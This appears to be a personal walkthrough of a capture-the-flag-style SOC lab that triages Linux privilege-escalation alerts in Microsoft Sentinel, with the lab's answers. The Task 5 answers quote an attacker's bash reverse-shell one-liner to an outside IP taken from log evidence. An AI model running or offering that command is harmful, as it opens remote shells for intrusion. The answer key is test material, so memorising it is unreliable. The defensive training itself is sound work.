# SOC Alert Triaging - Tinsel Triage
  > Investigate and triage alerts through Microsoft Sentinel.

## Task 1 -> Introduction
  > The Best Festival Company's Security Operations Center was in chaos. Screens flickered, lights flashed, and the sound of alerts echoed through the room like a digital thunderstorm. The elves rushed between consoles, their faces lit by the glow of red and orange warnings. It was raining alerts, and no one knew where the storm had begun.
Whispers spread through the SOC as tension filled the air. Something strange was happening across the cloud environment, and the timing couldn't be worse. As the blizzard of alerts grew heavier, one name surfaced among the worried elves: the evil Easter Bunnies. But why now? And what were they after this time?

- ``` I have successfully signed into the Azure portal, and I'm now ready to explore Azure! ``` marks the end of Task 1.

## Task 2 -> Alert Triaging Primer
 ### It's Raining Alerts
   > McSkidy was notified that it's raining alerts; something unusual is happening within the Azure tenant. The dashboards are lighting up with suspicious activities, and early signs indicate a possible attack from the Evil Bunnies. The Best Festival Company must act fast to survive this onslaught before it affects the entire season's operations.

  <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/bd6a3446-dc6d-440b-b60c-9ce592a8a894" />

   > Before investigating these alerts in Microsoft Sentinel, McSkidy must step back and understand what's happening. When alerts start flooding in, jumping straight into each one isn't efficient since not all alerts are equal. Some are noise, others are false positives, and a few may indicate real threats in progress.
This is where alert triaging becomes critical. Triaging helps security teams identify which alerts deserve immediate attention, which can be deprioritised, and which can be safely ignored for a moment. The process separates chaos from clarity, allowing analysts like McSkidy's SOC team to focus their time and resources where it truly matters.

### Alert Triaging
 > When multiple alerts appear, analysts should have a consistent method to assess and prioritise them quickly. There are many factors you can consider when triaging, but these are the fundamental ones that should always be part of your process of identifying and evaluating alerts:

  <img width="1552" height="471" alt="image" src="https://github.com/user-attachments/assets/c3a0d5a0-6faa-475f-bd93-b10f86f1f676" />

  > In short, these four represent the essential dimensions of triage:

  > 1. Severity: How bad?
  > 2. Time: When?
  > 3. Context: Where in the attack lifecycle?
  > 4. Impact: Who or what is affected?

> They form a balanced foundation that's simple enough for analysts to apply quickly but comprehensive enough for informed decisions.
After reviewing these factors, decide on your next step: escalate to the incident response team, perform a deeper investigation, or close the alert if it's confirmed to be a false positive. A structured triage process like this helps ensure that time and resources are focused on what truly matters.

### Diving Deeper into an Alert
 > After identifying which alerts deserve further attention, it's time to dig into the details. Follow these steps to investigate and correlate effectively:

- ***Investigate the alert in detail***
  > Open the alert and review the entities, event data, and detection logic. Confirm whether the activity represents real malicious behaviour.

- ***Check the related logs***
  > Examine the relevant log sources. Look for patterns or unusual actions that align with the alert.

- ***Correlate multiple alerts***
  > Identify other alerts involving the same user, IP address, or device. Correlation often reveals a broader attack sequence or coordinated activity.

- ***Build context and a timeline***
  > Combine timestamps, user actions, and affected assets to reconstruct the sequence of events. This helps determine if the attack is ongoing or has already been contained.

- ***Decide on the following action***
  > If there are indicators of compromise, escalate to the incident response team. Investigate further if more evidence or correlation is needed. Close or suppress if the alert is a confirmed false positive, and update detection rules accordingly.

- ***Document findings and lessons learned***
  > Keep a clear record of the analysis, decisions, and remediation steps. Proper documentation strengthens SOC processes and supports continuous improvement.

- ``` Let's proceed to the action! ``` marks the completion of the Task 2.

## Task 3 -> Environment Review
  > Before proceeding with alert triaging, let’s first review the lab environment.

- Logged into the ``` Microsoft Azure ``` portal.
- Opened ``` Microsoft Sentinel ``` and went to ``` Analytics ``` section under Threat Management.
- Selected all the ``` risks/alerts ``` and disabled them and enabled them again to trigger all of them.
- Checked for all the logs.

- ``` I have now reviewed the custom logs. ``` marks the completion of Task 3.

## Task 4 -> Investigation Proper
### McSkidy Goes Triaging
   > Working inside the actual SOC environment of the Best Festival Company hosted in Azure. This is where McSkidy will put her triage skills to the test using Microsoft Sentinel, a cloud-native SIEM and SOAR platform. Sentinel collects data from various Azure services, applications, and connected sources to detect, investigate, and respond to threats in real time.
Through Sentinel, McSkidy can view and manage alerts, analyse incidents, and correlate activities across multiple logs. It provides visibility into what's happening within the Azure tenant and efficiently allows analysts to pivot from one alert to another. In this next part, we'll explore how McSkidy reviews alerts, drills into the evidence, and uses Sentinel's investigation tools to uncover the truth behind the Evil Bunnies' attack.

 ### Microsoft Sentinel in Action
  - Opened ``` Incidents ``` section in the Microsoft Sentinel.

    <img width="2892" height="1408" alt="image" src="https://github.com/user-attachments/assets/d9e68bd5-2d01-48fd-9987-1a86deeabde9" />
  - Examined ```  Linux PrivEsc—Kernel Module Insertion ``` alert and got:
    > 1. There are three events related to the alert.
    > 2. The alert was recently created (note that this varies based on your lab instance).
    > 3. There are three entities involved in the alert.
    > 4. The alert is classified as a Privilege Escalation tactic.

     <img width="2434" height="1176" alt="image" src="https://github.com/user-attachments/assets/b00a8357-75dc-45ca-ae1a-ce68cf3ef9f2" />

- Opened Full Details section and analyzed it.

### Answers:
 - How many entities are affected by the Linux PrivEsc - Polkit Exploit Attempt alert?
   > 10
 - What is the severity of the Linux PrivEsc - Sudo Shadow Access alert?
   > High
 - How many accounts were added to the sudoers group in the Linux PrivEsc - User Added to Sudo Group alert?
   > 4


## Task 5 -> Diving Deeper Into Logs
 ### In-Depth Log Analysis with Sentinel
  > With the initial triage complete, McSkidy now examines the raw evidence behind these alerts. The next task involves diving into the underlying log data within Microsoft Sentinel to validate the alerts and uncover the exact attacker actions that triggered them. By analysing authentication attempts, command executions, and system changes, McSkidy can begin piecing together the full story of how the attack unfolded

- Opened ``` Events ``` from the  ``` Evidence ``` seciton.
- Using KQL map and using its queries found the answers asked in the task.

 ### Query:
  ```
    set query_now = datetime(2025-10-30T05:09:25.9886229Z);
    Syslog_CL
    | where host_s == 'app-02'
    | project _timestamp_t, host_s, Message
  ```

- Modifying this query according to the question asked, found the answers.

### Answers:
 - What is the name of the kernel module installed in websrv-01?
   > malicious_mod.ko
 - What is the unusual command executed within websrv-01 by the ops user?
   > /bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1
 - What is the source IP address of the first successful SSH login to storage-01?
   > 172.16.0.12
 - What is the external source IP that successfully logged in as root to app-01?
   > 203.0.113.45
 - Aside from the backup user, what is the name of the user added to the sudoers group inside app-01?
   > deploy


  


























